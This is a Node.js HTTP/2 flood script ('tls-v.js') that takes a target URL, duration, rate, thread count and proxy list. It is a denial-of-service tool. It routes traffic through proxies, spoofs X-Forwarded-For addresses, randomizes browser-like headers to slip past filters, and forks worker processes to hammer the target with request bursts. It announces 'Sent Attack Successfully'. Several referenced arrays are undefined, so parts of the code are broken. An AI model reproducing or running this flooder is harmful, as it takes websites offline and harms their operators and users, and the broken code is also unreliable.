const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const { HeaderGenerator } = require('header-generator');
const os = require("os");
const v8 = require("v8");
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage: node tls-v.js target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }

 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }

 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
  ];
  const fetch_site = [
    "same-origin"
    , "same-site"
    , "cross-site"
    , "none"
  ];
  const fetch_mode = [
    "navigate"
    , "same-origin"
    , "no-cors"
    , "cors"
  , ];
  const fetch_dest = [
    "document"
    , "sharedworker"
    , "subresource"
    , "unknown"
    , "worker", ];

    cache_header = [
        'max-age=0',
        'no-cache',
        'no-store',
        'pre-check=0',
        'post-check=0',
        'must-revalidate',
        'proxy-revalidate',
        's-maxage=604800',
        'no-cache, no-store,private, max-age=0, must-revalidate',
        'no-cache, no-store,private, s-maxage=604800, must-revalidate',
        'no-cache, no-store,private, max-age=604800, must-revalidate',
        'max-age=604800',
        'proxy-revalidate',
        'public, max-age=0',
        'max-age=315360000',
        'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
        's-maxage=604800',
        'max-stale',
        'public, immutable, max-age=31536000',
        'must-revalidate',
        'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
        'max-age=31536000,public,immutable',
        'max-age=31536000,public',
        'min-fresh',
        'private',
        'public',
        's-maxage',
        'no-cache',
        'no-cache, no-transform',
        'max-age=2592000',
        'no-store',
        'no-transform',
        'max-age=31557600',
        'stale-if-error',
        'only-if-cached',
        'max-age=0',
        'must-understand, no-store',
        'max-age=31536000; includeSubDomains',
        'max-age=31536000; includeSubDomains; preload',
        'max-age=120',
        'max-age=0,no-cache,no-store,must-revalidate',
        'public, max-age=604800, immutable',
        'max-age=0, must-revalidate, private',
        'max-age=0, private, must-revalidate',
        'max-age=604800, stale-while-revalidate=86400',
        'max-stale=3600',
        'public, max-age=2678400',
        'min-fresh=600',
        'public, max-age=30672000',
        'max-age=31536000, immutable',
        'max-age=604800, stale-if-error=86400',
        'public, max-age=604800',
        'no-cache, no-store,private, max-age=0, must-revalidate',
        'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
        'public, s-maxage=600, max-age=60',
        'public, max-age=31536000',
        'max-age=14400, public',
        'max-age=14400',
        'max-age=600, private',
        'public, s-maxage=600, max-age=60',
        'no-store, no-cache, must-revalidate',
        'no-cache, no-store,private, s-maxage=604800, must-revalidate',
        'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64',
      ];
      encoding_header = [
        '*',
        '*/*',
        'gzip',
        'gzip, deflate, br',
        'compress, gzip',
        'deflate, gzip',
        'gzip, identity',
        'gzip, deflate',
        'br',
        'br;q=1.0, gzip;q=0.8, *;q=0.1',
        'gzip;q=1.0, identity; q=0.5, *;q=0',
        'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
        'compress;q=0.5, gzip;q=1.0',
        'identity',
        'gzip, compress',
        'compress, deflate',
        'compress',
        'gzip, deflate, br',
        'deflate',
        'gzip, deflate, lzma, sdch',
        'deflate',
      ];
 const sig = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-AES128-SHA256",
  "ECDHE-RSA-AES128-SHA",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-RSA-AES256-SHA",
  "TLS_AES_128_GCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
   ];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
const nm = [
    "110.0.0.0",
    "111.0.0.0",
    "112.0.0.0",
    "113.0.0.0",
    "114.0.0.0",
    "115.0.0.0",
    "116.0.0.0",
    "117.0.0.0",
    "118.0.0.0",
    "119.0.0.0",
    ];
    const nmx = [
    "120.0",
    "119.0",
    "118.0",
    "117.0",
    "116.0",
    "115.0",
    "114.0",
    "113.0",
    "112.0",
    "111.0",
    ];
    const nmx1 = [
    "105.0.0.0",
    "104.0.0.0",
    "103.0.0.0",
    "102.0.0.0",
    "101.0.0.0",
    "100.0.0.0",
    "99.0.0.0",
    "98.0.0.0",
    "97.0.0.0",
    ];
    const sysos = [
    "Macintosh",
    "Windows 1.01",
    "Windows 1.02",
    "Windows 1.03",
    "Windows 1.04",
    "Windows 2.01",
    "Windows 3.0",
    "Windows NT 3.1",
    "Windows NT 3.5",
    "Windows 95",
    "Windows 98",
    "Windows 2006",
    "Windows NT 4.0",
    "Windows 95 Edition",
    "Windows 98 Edition",
    "Windows Me",
    "Windows Business",
    "Windows XP",
    "Windows 7",
    "Windows 8",
    "Windows 10 version 1507",
    "Windows 10 version 1511",
    "Windows 10 version 1607",
    "Windows 10 version 1703",
    ];
    const winarch = [
    "rv:40.0",
    "rv:41.0",
    "x86-16",
    "x86-16, IA32",
    "IA-32",
    "IA-32, Alpha, MIPS",
    "IA-32, Alpha, MIPS, PowerPC",
    "Itanium",
    "x86_64",
    "IA-32, x86-64",
    "IA-32, x86-64, ARM64",
    "x86-64, ARM64",
    "ARMv4, MIPS, SH-3",
    "ARMv4",
    "ARMv5",
    "ARMv7",
    "IA-32, x86-64, Itanium",
    "IA-32, x86-64, Itanium",
    "x86-64, Itanium",
    ];
    const winch = [
    "Intel Mac OS X 10.9",
    "Intel Mac OS X 10.7",
    "Intel Mac OS X 10_10_3",
    "Intel Mac OS X 10_10_1",
    "Intel Mac OS X 10_10_4",
    "2012 R2",
    "2019 R2",
    "2012 R2 Datacenter",
    "Server Blue",
    "Longhorn Server",
    "Whistler Server",
    "Shell Release",
    "Daytona",
    "Razzle",
    "HPC 2008",
    ];
    const rd = [
    "54356464636",
    "53435787890",
    "678685754",
    "347868769",
    ];

     var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
     var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
     var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
     var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
     var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
     var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];
     var villain = rd[Math.floor(Math.floor(Math.random() * rd.length))];
     function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
     const randomStringArray = Array.from({ length }, () => {
       const randomIndex = Math.floor(Math.random() * characters.length);
       return characters[randomIndex];
     });

     return randomStringArray.join('');
    }
    const ip_spoof = () => {
        const getRandomByte = () => {
          return Math.floor(Math.random() * 255);
        };
        return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
      };

      const spoofed = ip_spoof();
      const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
      const ciphers1 = "GREASE:" + [
          defaultCiphers[2],
          defaultCiphers[1],
          defaultCiphers[0],
          ...defaultCiphers.slice(3)
      ].join(":");
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
console.clear()
console.log("HEAP SIZE:", v8.getHeapStatistics().heap_size_limit / (1024 * 1024));
console.clear()
console.log(`Sent Attack Successfully To Host= ${process.argv[2]} Time= ${process.argv[3]} sec`);

 let headerGenerator = new HeaderGenerator({
    browsers: [
        { name: "firefox", minVersion: 112, httpVersion: "2" },
        { name: "opera", minVersion: 112, httpVersion: "2" },
        { name: "edge", minVersion: 112, httpVersion: "2" },
        { name: "chrome", minVersion: 112, httpVersion: "2" },
        { name: "safari", minVersion: 16, httpVersion: "2" },
    ],
    devices: [
        "desktop",
        "mobile",
    ],
    operatingSystems: [
        "windows",
        "linux",
        "macos",
        "android",
        "ios",
    ],
    locales: ["en-US", "en"]
 });

const MAX_RAM_PERCENTAGE = 35;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }

 class NetSocket {
     constructor(){}

  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);

     const connection = net.connect({
         host: options.host,
         port: options.port
     });

     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 60000);

     connection.on("connect", () => {
         connection.write(buffer);
     });

     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });

     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });

     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
 const KillScrip1t = () => process.exit(1);
 
 setTimeout(KillScrip1t, args.time * 1000);
 const Header = new NetSocket();
 headers[":method"] = "GET";
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
 headers[":authority"] = parsedTarget.host
 headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
 headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
 headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
 headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
 headers["Connection"] = "keep-alive";
 headers["upgrade-insecure-requests"] = randomHeaders['upgrade-insecure-requests'];
  headers["referer"] = "https://google.com?q=" + parsedTarget.host + " ngu",
 headers["TE"] = "trailers";
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["sec-ch-ua-platform"] = platform[Math.floor(Math.random() * platform.length)];
 headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
 headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
 headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
 headers["sec-fetch-user"] = "1";

 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
     headers["X-Forwarded-For"] = spoofed;
     headers["user-agent"] = generateRandomString(3,8)  + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + villain +" " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4;

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 30
     };

     Header.HTTP(proxyOptions, (connection, error) => {
         if (error) return

         connection.setKeepAlive(true, 60000);

         const tlsOptions = {
            ALPNProtocols: ['h2'],
            followAllRedirects: true,
            challengeToSolve: 5,
            clientTimeout: 5000,
            maxRedirects: 10,
            clientlareMaxTimeout: 15000,
            echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
            ciphers: cipper,
            rejectUnauthorized: false,
            socket: connection,
            decodeEmails: false,
            honorCipherOrder: true,
            requestCert: true,
            secure: true,
            port: parsedPort,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
        };

         const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

         tlsConn.setKeepAlive(true, 60 * 10000);

         const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
           headerTableSize: 65536,
           initialWindowSize: 15564991,
           maxFrameSize : 236619,
           maxHeaderListSize: 65536,
           enablePush: false
         },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
           headerTableSize: 65536,
           initialWindowSize: 15564991,
           maxFrameSize : 236619,
           maxHeaderListSize: 65536,
           enablePush: false
         });
    client.setMaxListeners(0);

         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0.1; i < args.Rate; i++) {
                    const request = client.request(headers)

                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });

                    request.end();
                }
            }, 850);
         });

         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });

         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }

 const KillScript = () => process.exit(1);

 setTimeout(KillScript, args.time * 1000);
